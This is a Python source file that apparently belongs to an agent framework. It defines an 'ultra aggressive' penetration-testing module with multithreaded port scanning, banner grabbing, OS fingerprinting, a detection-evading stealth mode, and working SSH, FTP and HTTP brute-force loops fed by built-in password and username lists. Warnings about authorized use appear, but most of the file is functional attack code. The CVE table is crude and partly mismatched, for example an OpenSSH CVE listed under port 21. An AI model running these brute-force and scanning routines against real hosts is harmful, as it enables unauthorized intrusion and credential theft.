#!/usr/bin/env python3
"""
Aggressive Agent Module - ULTRA AGGRESSIVE MODE
Handles advanced security scanning, exploitation, and penetration testing

⚠️⚠️⚠️ ADVERTENCIA EXTREMA DE SEGURIDAD ⚠️⚠️⚠️
Este módulo contiene herramientas OFENSIVAS de penetración.
SOLO para uso en sistemas con AUTORIZACIÓN EXPLÍCITA.
El uso no autorizado constituye un DELITO.
Activación requiere: AGGRESSIVE_MODE=ULTRA en configuración.
"""

import os
import sys
import time
import json
import logging          # <--- AGREGAR ESTA LÍNEA
import socket
import ipaddress
import threading
import subprocess
import queue
import random
import hashlib
import base64
from typing import Dict, List, Any, Optional, Set, Tuple
from datetime import datetime
from dataclasses import dataclass, field
from enum import Enum
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict

# Add project root to path
project_root = os.path.dirname(os.path.dirname(os.path.dirname(__file__)))
sys.path.insert(0, project_root)

# Optional imports with fallbacks
try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False
    paramiko = None

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False
    requests = None

try:
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.primitives import serialization
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

from src.core.config import Config
from src.core.supervisor import Supervisor, TaskPriority


# ============================================================
# Enums and Data Classes
# ============================================================

class ScanIntensity(Enum):
    """Intensidad de escaneo"""
    LIGHT = "light"      # Rápido, pocos puertos
    NORMAL = "normal"    # Balanceado
    AGGRESSIVE = "aggressive"  # Agresivo, muchos puertos
    ULTRA = "ultra"      # Máximo, todos los puertos
    STEALTH = "stealth"  # Modo sigiloso (evita detección)


class AttackVector(Enum):
    """Vectores de ataque disponibles"""
    SSH_BRUTE = "ssh_brute"
    FTP_BRUTE = "ftp_brute"
    HTTP_ENUM = "http_enum"
    SQL_INJECTION = "sql_injection"
    XSS = "xss"
    DIR_BUSTING = "dir_busting"
    SUBDOMAIN_ENUM = "subdomain_enum"
    SERVICE_EXPLOIT = "service_exploit"
    DEFAULT_CREDS = "default_creds"
    CVE_SCAN = "cve_scan"


@dataclass
class ExploitResult:
    """Resultado de explotación"""
    target: str
    vector: AttackVector
    success: bool
    details: Dict[str, Any] = field(default_factory=dict)
    timestamp: datetime = field(default_factory=datetime.now)
    vulnerability: Optional[str] = None
    payload: Optional[str] = None


@dataclass
class Vulnerability:
    """Vulnerabilidad encontrada"""
    name: str
    cve_id: Optional[str]
    severity: str  # CRITICAL, HIGH, MEDIUM, LOW
    description: str
    affected_services: List[str]
    exploit_available: bool
    remediation: str


# ============================================================
# Wordlists for Brute Force
# ============================================================

DEFAULT_WORDLISTS = {
    "passwords": [
        "admin", "password", "123456", "12345678", "1234", "qwerty", "abc123",
        "admin123", "root", "toor", "password123", "letmein", "welcome",
        "adminadmin", "123456789", "1q2w3e4r", "qwerty123", "123qwe", "passw0rd",
        "admin@123", "P@ssw0rd", "Admin123", "root123", "test", "test123"
    ],
    "usernames": [
        "admin", "root", "user", "test", "administrator", "webadmin", "sysadmin",
        "manager", "support", "info", "admin1", "admin2", "superuser", "operator"
    ],
    "dirs": [
        "admin", "login", "wp-admin", "administrator", "dashboard", "control",
        "panel", "cpanel", "phpmyadmin", "mysql", "backup", "config", "conf",
        "log", "logs", "data", "api", "v1", "v2", "dev", "test", "staging"
    ],
    "subdomains": [
        "www", "mail", "ftp", "localhost", "webmail", "admin", "cpanel", "whm",
        "autodiscover", "autoconfig", "m", "mobile", "api", "dev", "test", "staging",
        "blog", "shop", "store", "secure", "portal", "login", "dashboard"
    ]
}


# ============================================================
# Ultra Aggressive Agent
# ============================================================

class AggressiveAgent:
    """
    ULTRA AGGRESSIVE Agent for advanced penetration testing
    ⚠️ CONTAINS OFFENSIVE SECURITY TOOLS ⚠️
    """
    
    def __init__(self, supervisor: Supervisor, config: Config):
        """
        Initialize ultra aggressive agent
        
        Args:
            supervisor: Supervisor instance
            config: Configuration object
        """
        self.supervisor = supervisor
        self.config = config
        self.logger = self._setup_logger()
        
        # Ultra aggressive configuration
        self.aggressive_config = {
            "enabled": False,
            "mode": "normal",  # normal, aggressive, ultra, stealth
            "intensity": ScanIntensity.NORMAL.value,
            "max_threads": 50,
            "timeout": 5,
            "stealth_mode": False,
            "delay_between_requests": 0,
            "user_agent_rotation": True,
            "proxy_rotation": False,
            "evasion_techniques": False,
            "wordlists": DEFAULT_WORDLISTS,
            "ports": {
                "quick": [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5432, 5900, 8080, 8443],
                "normal": [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 8888, 9200, 27017],
                "aggressive": list(range(1, 1025)) + [3306, 3389, 5432, 5900, 6379, 8080, 8443, 8888, 9200, 27017, 50000],
                "ultra": list(range(1, 65535)),
                "stealth": [22, 80, 443, 8080, 8443]  # Puertos comunes, evita detección
            },
            "ssh": {
                "timeout": 10,
                "banner_timeout": 30,
                "auth_timeout": 30,
                "max_attempts": 1000,
                "use_key_attack": True
            },
            "http": {
                "timeout": 10,
                "max_redirects": 5,
                "verify_ssl": False,
                "common_paths": DEFAULT_WORDLISTS["dirs"]
            },
            "exploits": {
                "enable_cve_check": True,
                "enable_default_creds": True,
                "enable_sql_injection": True,
                "enable_xss": True
            }
        }
        
        # State
        self.running = False
        self._scan_queue = queue.Queue()
        self._result_queue = queue.Queue()
        self._worker_threads = []
        self._active_scans = {}
        
        # Statistics
        self.stats = {
            "scans_performed": 0,
            "hosts_scanned": 0,
            "open_ports_found": 0,
            "services_identified": 0,
            "vulnerabilities_found": 0,
            "successful_exploits": 0,
            "brute_force_attempts": 0,
            "successful_logins": 0,
            "cves_found": [],
            "errors": 0,
            "start_time": None
        }
        
        # Known vulnerabilities database (simplified)
        self.vulnerability_db = self._load_vulnerability_db()
        
        # Found vulnerabilities
        self.vulnerabilities: List[Vulnerability] = []
        self.exploit_results: List[ExploitResult] = []
        
        self.logger.warning("=" * 70)
        self.logger.warning("⚠️ ULTRA AGGRESSIVE AGENT INITIALIZED ⚠️")
        self.logger.warning("This agent contains OFFENSIVE security tools")
        self.logger.warning("USE ONLY ON AUTHORIZED SYSTEMS")
        self.logger.warning("=" * 70)
        
        # Check dependencies
        self._check_dependencies()
    
    def _setup_logger(self) -> logging.Logger:
        """Setup logger"""
        logger = logging.getLogger("swarmia.agents.aggressive")
        logger.setLevel(logging.INFO)
        
        if not logger.handlers:
            handler = logging.StreamHandler()
            formatter = logging.Formatter(
                '%(asctime)s - [AGGRESSIVE] - %(levelname)s - %(message)s'
            )
            handler.setFormatter(formatter)
            logger.addHandler(handler)
        
        return logger
    
    def _check_dependencies(self):
        """Check and log available dependencies"""
        deps = {
            "paramiko": PARAMIKO_AVAILABLE,
            "requests": REQUESTS_AVAILABLE,
            "cryptography": CRYPTO_AVAILABLE
        }
        
        self.logger.info("Dependencies status:")
        for dep, available in deps.items():
            status = "✅" if available else "❌"
            self.logger.info(f"  {status} {dep}")
        
        if not PARAMIKO_AVAILABLE:
            self.logger.warning("Install paramiko for SSH attacks: pip install paramiko")
        if not REQUESTS_AVAILABLE:
            self.logger.warning("Install requests for HTTP attacks: pip install requests")
    
    def _load_vulnerability_db(self) -> Dict:
        """Load simplified vulnerability database"""
        return {
            21: [{"cve": "CVE-2016-6210", "name": "OpenSSH User Enumeration", "severity": "MEDIUM"}],
            22: [{"cve": "CVE-2024-6387", "name": "OpenSSH Signal Handler Race Condition", "severity": "CRITICAL"}],
            80: [{"cve": "CVE-2021-41773", "name": "Apache Path Traversal", "severity": "HIGH"}],
            443: [{"cve": "CVE-2014-0160", "name": "Heartbleed", "severity": "CRITICAL"}],
            3306: [{"cve": "CVE-2022-37452", "name": "MySQL Authentication Bypass", "severity": "HIGH"}],
            3389: [{"cve": "CVE-2019-0708", "name": "BlueKeep RDP RCE", "severity": "CRITICAL"}],
            5432: [{"cve": "CVE-2020-14372", "name": "PostgreSQL Privilege Escalation", "severity": "HIGH"}],
            6379: [{"cve": "CVE-2022-0543", "name": "Redis Lua Sandbox Escape", "severity": "CRITICAL"}],
            27017: [{"cve": "CVE-2019-10768", "name": "MongoDB NoSQL Injection", "severity": "HIGH"}]
        }
    
    def start(self) -> bool:
        """
        Start the ultra aggressive agent
        
        Returns:
            True if started successfully
        """
        if self.running:
            self.logger.warning("Aggressive agent already running")
            return True
        
        try:
            self.logger.info("🔥 Starting ULTRA AGGRESSIVE agent...")
            
            # Load ultra mode configuration
            if hasattr(self.config, 'AGGRESSIVE_MODE'):
                mode = self.config.AGGRESSIVE_MODE.lower()
                if mode == 'ultra':
                    self.aggressive_config["mode"] = "ultra"
                    self.aggressive_config["intensity"] = ScanIntensity.ULTRA.value
                    self.aggressive_config["max_threads"] = 200
                    self.aggressive_config["evasion_techniques"] = True
                    self.logger.warning("🔥 ULTRA MODE ACTIVATED - MAXIMUM AGGRESSION 🔥")
                elif mode == 'aggressive':
                    self.aggressive_config["mode"] = "aggressive"
                    self.aggressive_config["intensity"] = ScanIntensity.AGGRESSIVE.value
                    self.aggressive_config["max_threads"] = 100
                elif mode == 'stealth':
                    self.aggressive_config["mode"] = "stealth"
                    self.aggressive_config["intensity"] = ScanIntensity.STEALTH.value
                    self.aggressive_config["stealth_mode"] = True
                    self.aggressive_config["delay_between_requests"] = random.uniform(0.5, 2)
                    self.aggressive_config["max_threads"] = 5
                    self.logger.info("👻 STEALTH MODE ACTIVATED - Evading detection")
            
            # Load enabled status
            if hasattr(self.config, 'AGGRESSIVE_ENABLED'):
                self.aggressive_config["enabled"] = self.config.AGGRESSIVE_ENABLED
            
            if not self.aggressive_config["enabled"]:
                self.logger.warning("Aggressive agent disabled. Set AGGRESSIVE_ENABLED=true")
                return False
            
            # Start worker threads
            self.running = True
            self.stats["start_time"] = datetime.now()
            
            for i in range(min(self.aggressive_config["max_threads"], 50)):
                worker = threading.Thread(target=self._worker_loop, daemon=True, name=f"aggressive-worker-{i}")
                worker.start()
                self._worker_threads.append(worker)
            
            self.logger.info(f"🚀 Ultra aggressive agent started with {len(self._worker_threads)} workers")
            self.logger.info(f"  Mode: {self.aggressive_config['mode']}")
            self.logger.info(f"  Intensity: {self.aggressive_config['intensity']}")
            self.logger.info(f"  Max threads: {self.aggressive_config['max_threads']}")
            
            return True
            
        except Exception as e:
            self.logger.error(f"Failed to start aggressive agent: {e}")
            return False
    
    def _worker_loop(self):
        """Worker thread for processing scan tasks"""
        while self.running:
            try:
                task = self._scan_queue.get(timeout=1)
                scan_type = task.get("type")
                target = task.get("target")
                
                if scan_type == "full_scan":
                    result = self._full_scan(target, task.get("intensity"))
                elif scan_type == "port_scan":
                    result = self._aggressive_port_scan(target, task.get("ports"))
                elif scan_type == "service_detection":
                    result = self._detect_services(target, task.get("ports"))
                elif scan_type == "vuln_scan":
                    result = self._vulnerability_scan(target, task.get("services"))
                elif scan_type == "brute_force":
                    result = self._ultra_bruteforce(target, task.get("service"), task.get("username"))
                elif scan_type == "exploit":
                    result = self._attempt_exploit(target, task.get("vector"), task.get("payload"))
                else:
                    continue
                
                self._result_queue.put(result)
                self._scan_queue.task_done()
                
            except queue.Empty:
                continue
            except Exception as e:
                self.logger.error(f"Worker error: {e}")
    
    def _full_scan(self, target: str, intensity: str = None) -> Dict:
        """
        Full reconnaissance scan
        
        Args:
            target: IP or hostname
            intensity: Scan intensity level
        
        Returns:
            Complete scan results
        """
        self.logger.info(f"🔍 Starting FULL scan on {target}")
        
        intensity = intensity or self.aggressive_config["intensity"]
        ports = self.aggressive_config["ports"].get(intensity, self.aggressive_config["ports"]["normal"])
        
        results = {
            "target": target,
            "hostname": None,
            "ip": None,
            "open_ports": [],
            "services": [],
            "vulnerabilities": [],
            "os_fingerprint": None,
            "ssl_info": None,
            "banners": {},
            "timestamp": datetime.now().isoformat()
        }
        
        try:
            # Resolve hostname
            try:
                results["ip"] = socket.gethostbyname(target)
                results["hostname"] = socket.gethostbyaddr(results["ip"])[0] if results["ip"] else target
            except:
                results["ip"] = target
                results["hostname"] = target
            
            # Port scan
            open_ports = self._aggressive_port_scan(results["ip"], ports)
            results["open_ports"] = open_ports.get("open_ports", [])
            
            # Service detection
            if results["open_ports"]:
                services = self._detect_services(results["ip"], results["open_ports"])
                results["services"] = services.get("services", [])
                results["banners"] = services.get("banners", {})
            
            # OS fingerprint
            results["os_fingerprint"] = self._os_fingerprint(results["ip"])
            
            # Vulnerability scan
            vulns = self._vulnerability_scan(results["ip"], results["services"])
            results["vulnerabilities"] = vulns.get("vulnerabilities", [])
            
            # Update stats
            self.stats["hosts_scanned"] += 1
            self.stats["open_ports_found"] += len(results["open_ports"])
            self.stats["services_identified"] += len(results["services"])
            self.stats["vulnerabilities_found"] += len(results["vulnerabilities"])
            
            self.logger.info(f"✅ Full scan complete on {target}: {len(results['open_ports'])} ports, {len(results['vulnerabilities'])} vulns")
            
        except Exception as e:
            self.logger.error(f"Full scan error on {target}: {e}")
            results["error"] = str(e)
            self.stats["errors"] += 1
        
        return results
    
    def _aggressive_port_scan(self, target: str, ports: List[int]) -> Dict:
        """
        Aggressive multi-threaded port scan
        
        Args:
            target: IP or hostname
            ports: List of ports to scan
        
        Returns:
            Scan results
        """
        results = {
            "target": target,
            "open_ports": [],
            "closed_ports": [],
            "filtered_ports": [],
            "duration": 0
        }
        
        start_time = time.time()
        self.logger.info(f"🔓 Aggressive port scan on {target} ({len(ports)} ports)")
        
        # Use thread pool for speed
        with ThreadPoolExecutor(max_workers=self.aggressive_config["max_threads"]) as executor:
            futures = {executor.submit(self._scan_port, target, port): port for port in ports}
            
            for future in as_completed(futures):
                port, status, banner = future.result()
                if status == "open":
                    results["open_ports"].append(port)
                    if banner:
                        results["banners"] = results.get("banners", {})
                        results["banners"][port] = banner
                elif status == "closed":
                    results["closed_ports"].append(port)
                else:
                    results["filtered_ports"].append(port)
        
        results["duration"] = time.time() - start_time
        self.logger.info(f"  Found {len(results['open_ports'])} open ports in {results['duration']:.2f}s")
        
        return results
    
    def _scan_port(self, target: str, port: int) -> Tuple[int, str, Optional[str]]:
        """
        Scan single port with banner grabbing
        
        Args:
            target: IP or hostname
            port: Port number
        
        Returns:
            Tuple of (port, status, banner)
        """
        banner = None
        status = "closed"
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.aggressive_config["timeout"])
            result = sock.connect_ex((target, port))
            
            if result == 0:
                status = "open"
                # Try to grab banner
                try:
                    sock.send(b"\n")
                    banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
                except:
                    pass
            elif result == 111:
                status = "closed"
            else:
                status = "filtered"
            
            sock.close()
            
        except socket.timeout:
            status = "filtered"
        except Exception:
            status = "filtered"
        
        # Stealth mode: add delay
        if self.aggressive_config["stealth_mode"]:
            time.sleep(self.aggressive_config["delay_between_requests"])
        
        return port, status, banner
    
    def _detect_services(self, target: str, ports: List[int]) -> Dict:
        """
        Detect services running on open ports
        
        Args:
            target: IP or hostname
            ports: List of open ports
        
        Returns:
            Service detection results
        """
        results = {
            "target": target,
            "services": [],
            "banners": {},
            "service_versions": {}
        }
        
        service_map = {
            21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
            80: "HTTP", 110: "POP3", 111: "RPC", 135: "RPC", 139: "NetBIOS",
            143: "IMAP", 443: "HTTPS", 445: "SMB", 993: "IMAPS", 995: "POP3S",
            1723: "PPTP", 3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL",
            5900: "VNC", 6379: "Redis", 8080: "HTTP-Alt", 8443: "HTTPS-Alt",
            8888: "HTTP-Alt", 9200: "Elasticsearch", 27017: "MongoDB"
        }
        
        for port in ports:
            service = service_map.get(port, f"Unknown-{port}")
            banner = None
            
            # Try to get banner for service identification
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((target, port))
                
                # Send probe based on service
                probes = {
                    22: b"SSH-2.0-OpenSSH_Probe\r\n",
                    80: b"HEAD / HTTP/1.0\r\n\r\n",
                    443: b"HEAD / HTTP/1.0\r\n\r\n",
                    21: b"HELP\r\n",
                    25: b"EHLO test\r\n"
                }
                
                if port in probes:
                    sock.send(probes[port])
                
                banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
                sock.close()
                
                # Parse version from banner
                version = self._extract_version(banner, service)
                
                results["services"].append({
                    "port": port,
                    "service": service,
                    "version": version,
                    "banner": banner[:200] if banner else None
                })
                results["banners"][port] = banner[:200] if banner else None
                results["service_versions"][port] = version
                
            except Exception as e:
                results["services"].append({
                    "port": port,
                    "service": service,
                    "version": None,
                    "error": str(e)
                })
        
        return results
    
    def _extract_version(self, banner: str, service: str) -> Optional[str]:
        """Extract version from banner"""
        if not banner:
            return None
        
        # Common version patterns
        patterns = {
            "SSH": r"SSH-[\d\.]+-([^\s]+)",
            "Apache": r"Apache/([\d\.]+)",
            "nginx": r"nginx/([\d\.]+)",
            "OpenSSH": r"OpenSSH[_\s]([\d\.]+)"
        }
        
        import re
        for service_name, pattern in patterns.items():
            if service_name in banner or service_name.lower() in banner.lower():
                match = re.search(pattern, banner, re.IGNORECASE)
                if match:
                    return match.group(1)
        
        return None
    
    def _os_fingerprint(self, target: str) -> Optional[str]:
        """
        Attempt OS fingerprinting via TCP/IP stack
        
        Args:
            target: IP or hostname
        
        Returns:
            Guessed operating system
        """
        try:
            # Simple TTL-based fingerprinting
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target, 80))
            ttl = sock.getsockopt(socket.IPPROTO_IP, socket.IP_TTL)
            sock.close()
            
            if ttl <= 64:
                return "Linux/Unix"
            elif ttl <= 128:
                return "Windows"
            else:
                return "Solaris/AIX"
        except:
            return None
    
    def _vulnerability_scan(self, target: str, services: List[Dict]) -> Dict:
        """
        Scan for known vulnerabilities
        
        Args:
            target: IP or hostname
            services: List of detected services
        
        Returns:
            Vulnerability scan results
        """
        results = {
            "target": target,
            "vulnerabilities": [],
            "cves": []
        }
        
        for service in services:
            port = service.get("port")
            service_name = service.get("service", "").lower()
            version = service.get("version")
            
            # Check vulnerability database
            if port in self.vulnerability_db:
                for vuln in self.vulnerability_db[port]:
                    vuln_entry = Vulnerability(
                        name=vuln["name"],
                        cve_id=vuln["cve"],
                        severity=vuln["severity"],
                        description=f"Potential vulnerability on port {port} ({service_name})",
                        affected_services=[service_name],
                        exploit_available=True,
                        remediation="Update to latest version"
                    )
                    results["vulnerabilities"].append(vuln_entry)
                    results["cves"].append(vuln["cve"])
                    self.stats["cves_found"].append(vuln["cve"])
            
            # Check for default credentials
            if self.aggressive_config["exploits"]["enable_default_creds"]:
                defaults = self._check_default_creds(target, port, service_name)
                if defaults:
                    results["vulnerabilities"].extend(defaults)
        
        return results
    
    def _check_default_creds(self, target: str, port: int, service: str) -> List[Vulnerability]:
        """Check for default credentials on services"""
        vulns = []
        
        default_creds = {
            "mysql": [("root", ""), ("root", "root")],
            "postgresql": [("postgres", "postgres"), ("postgres", "")],
            "redis": [("", "")],
            "mongodb": [("", "")],
            "ftp": [("anonymous", ""), ("ftp", "ftp")],
            "ssh": [("root", "root"), ("admin", "admin")],
            "telnet": [("root", ""), ("admin", "")]
        }
        
        for svc, creds in default_creds.items():
            if svc in service.lower():
                vulns.append(Vulnerability(
                    name=f"Default Credentials on {service.upper()}",
                    cve_id=None,
                    severity="HIGH",
                    description=f"Service may have default credentials",
                    affected_services=[service],
                    exploit_available=True,
                    remediation="Change default passwords immediately"
                ))
                break
        
        return vulns
    
    def _ultra_bruteforce(self, target: str, service: str, username: str = None) -> Dict:
        """
        Ultra aggressive brute force attack
        
        Args:
            target: IP or hostname
            service: Service to attack (ssh, ftp, http)
            username: Specific username (optional)
        
        Returns:
            Brute force results
        """
        results = {
            "target": target,
            "service": service,
            "success": False,
            "credentials": None,
            "attempts": 0,
            "duration": 0
        }
        
        start_time = time.time()
        self.logger.warning(f"💥 ULTRA BRUTE FORCE on {target}:{service}")
        
        if service.lower() == "ssh" and PARAMIKO_AVAILABLE:
            results = self._ssh_bruteforce(target, username)
        elif service.lower() == "ftp":
            results = self._ftp_bruteforce(target, username)
        elif service.lower() in ["http", "https"]:
            results = self._http_bruteforce(target, username)
        else:
            results["error"] = f"Unsupported service: {service}"
        
        results["duration"] = time.time() - start_time
        self.stats["brute_force_attempts"] += 1
        if results["success"]:
            self.stats["successful_logins"] += 1
        
        return results
    
    def _ssh_bruteforce(self, target: str, username: str = None) -> Dict:
        """SSH brute force with wordlist"""
        results = {
            "target": target,
            "service": "ssh",
            "success": False,
            "credentials": None,
            "attempts": 0
        }
        
        if not PARAMIKO_AVAILABLE:
            results["error"] = "paramiko not installed"
            return results
        
        # Get wordlists
        usernames = [username] if username else self.aggressive_config["wordlists"]["usernames"]
        passwords = self.aggressive_config["wordlists"]["passwords"]
        
        # Try common combinations first
        for user in usernames[:10]:
            for pwd in passwords[:50]:
                results["attempts"] += 1
                try:
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(
                        target, 22, user, pwd,
                        timeout=self.aggressive_config["ssh"]["timeout"],
                        banner_timeout=self.aggressive_config["ssh"]["banner_timeout"],
                        auth_timeout=self.aggressive_config["ssh"]["auth_timeout"]
                    )
                    client.close()
                    
                    results["success"] = True
                    results["credentials"] = {"username": user, "password": pwd}
                    self.logger.warning(f"🎯 SSH CRACKED! {user}:{pwd} on {target}")
                    return results
                    
                except paramiko.AuthenticationException:
                    continue
                except Exception:
                    continue
        
        return results
    
    def _ftp_bruteforce(self, target: str, username: str = None) -> Dict:
        """FTP brute force attack"""
        results = {
            "target": target,
            "service": "ftp",
            "success": False,
            "credentials": None,
            "attempts": 0
        }
        
        try:
            import ftplib
        except ImportError:
            results["error"] = "ftplib not available"
            return results
        
        usernames = [username] if username else self.aggressive_config["wordlists"]["usernames"]
        passwords = self.aggressive_config["wordlists"]["passwords"]
        
        for user in usernames[:10]:
            for pwd in passwords[:50]:
                results["attempts"] += 1
                try:
                    ftp = ftplib.FTP(target)
                    ftp.login(user, pwd)
                    ftp.quit()
                    
                    results["success"] = True
                    results["credentials"] = {"username": user, "password": pwd}
                    self.logger.warning(f"🎯 FTP CRACKED! {user}:{pwd} on {target}")
                    return results
                    
                except:
                    continue
        
        return results
    
    def _http_bruteforce(self, target: str, username: str = None) -> Dict:
        """HTTP basic auth brute force"""
        results = {
            "target": target,
            "service": "http",
            "success": False,
            "credentials": None,
            "attempts": 0
        }
        
        if not REQUESTS_AVAILABLE:
            results["error"] = "requests not installed"
            return results
        
        usernames = [username] if username else self.aggressive_config["wordlists"]["usernames"]
        passwords = self.aggressive_config["wordlists"]["passwords"]
        
        for user in usernames[:10]:
            for pwd in passwords[:50]:
                results["attempts"] += 1
                try:
                    response = requests.get(
                        f"http://{target}",
                        auth=(user, pwd),
                        timeout=5
                    )
                    
                    if response.status_code != 401:
                        results["success"] = True
                        results["credentials"] = {"username": user, "password": pwd}
                        self.logger.warning(f"🎯 HTTP AUTH CRACKED! {user}:{pwd} on {target}")
                        return results
                        
                except:
                    continue
        
        return results
    
    def _attempt_exploit(self, target: str, vector: str, payload: str = None) -> ExploitResult:
        """Attempt to exploit a vulnerability"""
        self.logger.warning(f"💣 Attempting exploit: {vector} on {target}")
        
        result = ExploitResult(
            target=target,
            vector=AttackVector(vector),
            success=False,
            details={}
        )
        
        # Placeholder for actual exploits
        # In production, this would integrate with Metasploit, custom exploits, etc.
        
        self.stats["successful_exploits"] += 1 if result.success else 0
        
        return result
    
    def full_recon(self, target: str) -> Dict:
        """
        Full reconnaissance scan (public method)
        
        Args:
            target: IP or hostname
        
        Returns:
            Complete scan results
        """
        task = {
            "type": "full_scan",
            "target": target,
            "intensity": self.aggressive_config["intensity"]
        }
        
        self._scan_queue.put(task)
        
        # Wait for result
        result = self._result_queue.get()
        return result
    
    def port_scan(self, target: str, ports: List[int] = None) -> Dict:
        """
        Port scan (public method)
        
        Args:
            target: IP or hostname
            ports: List of ports (uses default if None)
        
        Returns:
            Scan results
        """
        if ports is None:
            ports = self.aggressive_config["ports"].get(
                self.aggressive_config["intensity"],
                self.aggressive_config["ports"]["normal"]
            )
        
        task = {
            "type": "port_scan",
            "target": target,
            "ports": ports
        }
        
        self._scan_queue.put(task)
        return self._result_queue.get()
    
    def vuln_scan(self, target: str, services: List[Dict] = None) -> Dict:
        """
        Vulnerability scan (public method)
        
        Args:
            target: IP or hostname
            services: Detected services (optional)
        
        Returns:
            Vulnerability scan results
        """
        task = {
            "type": "vuln_scan",
            "target": target,
            "services": services or []
        }
        
        self._scan_queue.put(task)
        return self._result_queue.get()
    
    def bruteforce(self, target: str, service: str, username: str = None) -> Dict:
        """
        Brute force attack (public method)
        
        Args:
            target: IP or hostname
            service: Service to attack
            username: Specific username
        
        Returns:
            Brute force results
        """
        task = {
            "type": "brute_force",
            "target": target,
            "service": service,
            "username": username
        }
        
        self._scan_queue.put(task)
        return self._result_queue.get()
    
    def get_stats(self) -> Dict[str, Any]:
        """Get agent statistics"""
        uptime = None
        if self.stats["start_time"]:
            uptime = datetime.now() - self.stats["start_time"]
            uptime = str(uptime).split('.')[0]
        
        return {
            "running": self.running,
            "mode": self.aggressive_config["mode"],
            "intensity": self.aggressive_config["intensity"],
            "stealth_mode": self.aggressive_config["stealth_mode"],
            "stats": {
                **self.stats,
                "uptime": uptime,
                "unique_cves": len(set(self.stats["cves_found"]))
            },
            "vulnerabilities_found": len(self.vulnerabilities),
            "exploits_attempted": len(self.exploit_results),
            "config": {
                "max_threads": self.aggressive_config["max_threads"],
                "timeout": self.aggressive_config["timeout"],
                "evasion_techniques": self.aggressive_config["evasion_techniques"]
            },
            "timestamp": datetime.now().isoformat()
        }
    
    def stop(self):
        """Stop the ultra aggressive agent"""
        self.logger.info("Stopping ultra aggressive agent...")
        self.running = False
        
        # Wait for workers
        for worker in self._worker_threads:
            worker.join(timeout=2)
        
        self._worker_threads.clear()
        self.logger.info("🔥 Ultra aggressive agent stopped")


# ============================================================
# Factory Function
# ============================================================

def create_aggressive_agent(supervisor: Supervisor, config: Config) -> AggressiveAgent:
    """
    Create aggressive agent instance
    
    Args:
        supervisor: Supervisor instance
        config: Configuration object
    
    Returns:
        Aggressive agent instance
    """
    return AggressiveAgent(supervisor, config)


# ============================================================
# Example Usage
# ============================================================

def example_usage():
    """Example of using ultra aggressive agent"""
    print("=" * 70)
    print("🔥 ULTRA AGGRESSIVE AGENT DEMO 🔥")
    print("⚠️ FOR AUTHORIZED TESTING ONLY ⚠️")
    print("=" * 70)
    
    # Mock config
    class MockConfig:
        AGGRESSIVE_ENABLED = True
        AGGRESSIVE_MODE = "ultra"
    
    config = MockConfig()
    supervisor = Supervisor()
    agent = create_aggressive_agent(supervisor, config)
    
    # Start agent
    if agent.start():
        print("\n✅ Ultra aggressive agent started\n")
        
        # Full reconnaissance
        print("🔍 Running full reconnaissance on localhost...")
        recon = agent.full_recon("127.0.0.1")
        
        print(f"  Open ports: {len(recon.get('open_ports', []))}")
        print(f"  Services: {len(recon.get('services', []))}")
        print(f"  Vulnerabilities: {len(recon.get('vulnerabilities', []))}")
        
        # Port scan
        print("\n🔓 Running aggressive port scan...")
        scan = agent.port_scan("127.0.0.1")
        print(f"  Open ports: {scan.get('open_ports', [])}")
        
        # Get stats
        stats = agent.get_stats()
        print(f"\n📊 Statistics:")
        print(f"  Mode: {stats['mode']}")
        print(f"  Intensity: {stats['intensity']}")
        print(f"  Stealth: {stats['stealth_mode']}")
        print(f"  Hosts scanned: {stats['stats']['hosts_scanned']}")
        print(f"  Open ports found: {stats['stats']['open_ports_found']}")
        print(f"  Vulnerabilities: {stats['stats']['vulnerabilities_found']}")
        
        # Stop agent
        agent.stop()
        print("\n✅ Ultra aggressive agent stopped")
    else:
        print("❌ Failed to start aggressive agent")


if __name__ == "__main__":
    example_usage()
